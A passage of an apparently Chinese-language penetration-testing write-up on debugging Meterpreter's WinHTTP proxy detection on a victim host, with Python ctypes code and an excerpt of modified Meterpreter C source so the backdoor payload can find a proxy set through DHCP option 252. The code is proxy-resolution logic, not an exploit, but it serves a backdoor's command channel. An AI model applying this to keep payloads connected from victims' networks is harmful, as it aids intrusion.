    print "[+] IE config set to autodetect with URL %s" % ieConfig.lpszAutoConfigUrl
    autoProxyOpts.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT | WINHTTP_AUTOPROXY_CONFIG_URL
    autoProxyOpts.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A
    autoProxyOpts.fAutoLogonIfChallenged = True
    autoProxyOpts.lpszAutoConfigUrl = ieConfig.lpszAutoConfigUrl
    hInternet = ctypes.windll.winhttp.WinHttpOpen(WINHTTP_USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, WINHTTP_FLAG_ASYNC)        
    if not hInternet:
    print "[-] Error on WinHttpOpen: %s" % ctypes.GetLastError()
    sys.exit()
    result = ctypes.windll.winhttp.WinHttpGetProxyForUrl(hInternet, unicode(test_url), ctypes.byref(autoProxyOpts), ctypes.byref(proxyInfo))
    if not result:
    print "[-] Error on WinHttpGetProxyForUrl: %s" % ctypes.GetLastError()
    sys.exit()
    print "[+] Proxy Host: %s" % proxyInfo.lpszProxy
    elif ieConfig.lpszProxy:
    print "[+] IE config set to proxy %s with bypass %s" % (ieConfig.lpszProxy, ieConfig.lpszProxyBypass)
这一段脚本程序在受害者主机上的执行结果如下图所示：
从脚本的输出信息中，我们可知Python程序的执行结果与C版本的一致。程序检测到代理的自动配置选项，但没有获取到代理地址。
如果我们再次检查代码，我们会发现，程序在某个“if”代码块内判断是否可能使用DHCP以及DNS获取代理信息，如果自动配置URL（ieConfig.lpszAutoConfigUrl）的条件为真就会执行这个代码块。然而，如果仅仅启用了AutoDetect选项，这部分代码并不会被执行，而这正是受害者主机上发生的情况。
在这个特定场景中（受害者主机所处的环境），代理的配置信息需要通过DHCP的252选项获取。
受害者主机上嗅探的DHCP传输数据包如下图所示：
从这个传输数据包中我们可以看出，DHCP服务器的应答中包含252选项（“Private/Proxy
autodiscovery”，私有选项，用于代理的自动发现），包含代理的URL地址。这正是我们在运行autoprox.exe工具时获得的信息。
在继续分析之前，我们需要了解Windows为代理配置提供的三种选项：
1、自动检测代理设置：使用DHCP（252选项）获取代理URL地址，或者使用DNS、LLMNR、NBNS（如果启用的话）获取WPAD主机名；
2、使用自动配置脚本：从某个URL下载配置脚本，通过这个脚本决定何时使用代理服务器；
3、手动设置代理服务器：为不同的协议手动配置代理服务器。
关于这个问题的根本原因，现在我们又掌握了更多的信息，我会稍微修改程序代码，将代理自动检测的可能性考虑在内。让我们先修改Python代码，如果代码工作正常，我们就可以修改Meterpreter的C语言代码，然后再编译生成Meterpreter载荷。
修改后的Python代码如下所示：
    import ctypes
    import ctypes.wintypes
    import sys
    class WINHTTP_CURRENT_USER_IE_PROXY_CONFIG(ctypes.Structure):
        _fields_ = [("fAutoDetect", ctypes.wintypes.BOOL),
                    ("lpszAutoConfigUrl", ctypes.wintypes.LPWSTR),
                    ("lpszProxy", ctypes.wintypes.LPWSTR),
                    ("lpszProxyBypass", ctypes.wintypes.LPWSTR)]
    class WINHTTP_AUTOPROXY_OPTIONS(ctypes.Structure):
        _fields_ = [("dwFlags", ctypes.wintypes.DWORD),
                    ("dwAutoDetectFlags", ctypes.wintypes.DWORD),
                    ("lpszAutoConfigUrl", ctypes.wintypes.LPCWSTR),
                    ("lpvReserved", ctypes.c_void_p),
                    ("dwReserved", ctypes.wintypes.DWORD),
                    ("fAutoLogonIfChallenged", ctypes.wintypes.BOOL)]
    class WINHTTP_PROXY_INFO(ctypes.Structure):
        _fields_ = [("dwAccessType", ctypes.wintypes.DWORD),
                    ("lpszProxy", ctypes.wintypes.LPCWSTR),
                    ("lpszProxyBypass", ctypes.wintypes.LPCWSTR)]
    # dwFlags values
    WINHTTP_AUTOPROXY_AUTO_DETECT = 0x00000001
    WINHTTP_AUTOPROXY_CONFIG_URL = 0x00000002
    # dwAutoDetectFlags values
    WINHTTP_AUTO_DETECT_TYPE_DHCP = 0x00000001
    WINHTTP_AUTO_DETECT_TYPE_DNS_A = 0x00000002
    # Parameters for WinHttpOpen
    WINHTTP_USER_AGENT = "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko"
    WINHTTP_ACCESS_TYPE_DEFAULT_PROXY = 0
    WINHTTP_NO_PROXY_NAME = 0
    WINHTTP_NO_PROXY_BYPASS = 0
    WINHTTP_FLAG_ASYNC = 0x10000000
    test_url = "http://www.google.com"
    # Gets the current user IE proxy configuration
    ieConfig = WINHTTP_CURRENT_USER_IE_PROXY_CONFIG()
    result = ctypes.windll.winhttp.WinHttpGetIEProxyConfigForCurrentUser(ctypes.byref(ieConfig))
    if not result:
        print "[-] Error on WinHttpGetIEProxyConfigForCurrentUser: %s" % ctypes.GetLastError()
        sys.exit()
    print "[+] Got IE configuration"
    print "tAutoDetect: %s" % ieConfig.fAutoDetect
    print "tAuto URL: %s" % ieConfig.lpszAutoConfigUrl
    print "tProxy: %s" % ieConfig.lpszProxy
    print "tProxy Bypass: %s" % ieConfig.lpszProxyBypass
    # We have three alternatives:
    #  1. The configuration is to "auto detect" the proxy, that is, via DHCP or DNS
    #  2. There is a URL for the script with the configuratoin (proxy autoconfiguration, PAC)
    #  3. A manually configured proxy is being used
    if ieConfig.lpszAutoConfigUrl or ieConfig.fAutoDetect:
        autoProxyOpts = WINHTTP_AUTOPROXY_OPTIONS()
        proxyInfo = WINHTTP_PROXY_INFO()
        if ieConfig.lpszAutoConfigUrl:
            print "[+] IE config set to autodetect with URL %s" % ieConfig.lpszAutoConfigUrl
            autoProxyOpts.dwFlags = WINHTTP_AUTOPROXY_CONFIG_URL
            autoProxyOpts.dwAutoDetectFlags = 0
            autoProxyOpts.lpszAutoConfigUrl = ieConfig.lpszAutoConfigUrl
        if ieConfig.fAutoDetect:
            print "[+] IE config set to autodetect via DHCP or DNS"
            autoProxyOpts.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT
            autoProxyOpts.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A
            autoProxyOpts.lpszAutoConfigUrl = 0
        autoProxyOpts.fAutoLogonIfChallenged = True
        hInternet = ctypes.windll.winhttp.WinHttpOpen(WINHTTP_USER_AGENT,  WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, WINHTTP_FLAG_ASYNC)        
        if not hInternet:
            print "[-] Error on WinHttpOpen: %s" % ctypes.GetLastError()
            sys.exit()
        result = ctypes.windll.winhttp.WinHttpGetProxyForUrl(hInternet, unicode(test_url), ctypes.byref(autoProxyOpts), ctypes.byref(proxyInfo))
        if not result:
            print "[-] Error on WinHttpGetProxyForUrl: %s" % ctypes.GetLastError()
            sys.exit()
        print "[+] Proxy Host: %s" % proxyInfo.lpszProxy
    elif ieConfig.lpszProxy:
        print "[+] IE config set to proxy %s with bypass %s" % (ieConfig.lpszProxy, ieConfig.lpszProxyBypass)
修改后的代码考虑到了通过DHCP/DNS获取代理的可能性。现在我们可以运行这段代码，观察代码的执行结果。
修改后的Python代码在受害者主机上的执行结果如下图所示：
从上图可知，程序成功通过DHCP获取了代理信息，代理信息与本文开头给出的信息一致（即10.x.x.20）。
Python版的代码工作正常，我们可以更新Meterpreter的C版代码（server_transport_winhttp.c），测试我们的后门程序能否正常运行。
修改后的Meterpreter源代码如下所示：
    ...
    dprintf("[PROXY] Got IE configuration");
    dprintf("[PROXY] AutoDetect: %s", ieConfig.fAutoDetect ? "yes" : "no");
    dprintf("[PROXY] Auto URL: %S", ieConfig.lpszAutoConfigUrl);
    dprintf("[PROXY] Proxy: %S", ieConfig.lpszProxy);
    dprintf("[PROXY] Proxy Bypass: %S", ieConfig.lpszProxyBypass);
    if (ieConfig.lpszAutoConfigUrl || ieConfig.fAutoDetect)
    {
    WINHTTP_AUTOPROXY_OPTIONS autoProxyOpts = { 0 };
    WINHTTP_PROXY_INFO proxyInfo = { 0 }; 
    if (ieConfig.fAutoDetect)
    {
    dprintf("[PROXY] IE config set to autodetect via DHCP or DNS");
    autoProxyOpts.dwFlags = WINHTTP_AUTOPROXY_AUTO_DETECT;
    autoProxyOpts.dwAutoDetectFlags = WINHTTP_AUTO_DETECT_TYPE_DHCP | WINHTTP_AUTO_DETECT_TYPE_DNS_A;
    autoProxyOpts.lpszAutoConfigUrl = 0;
    }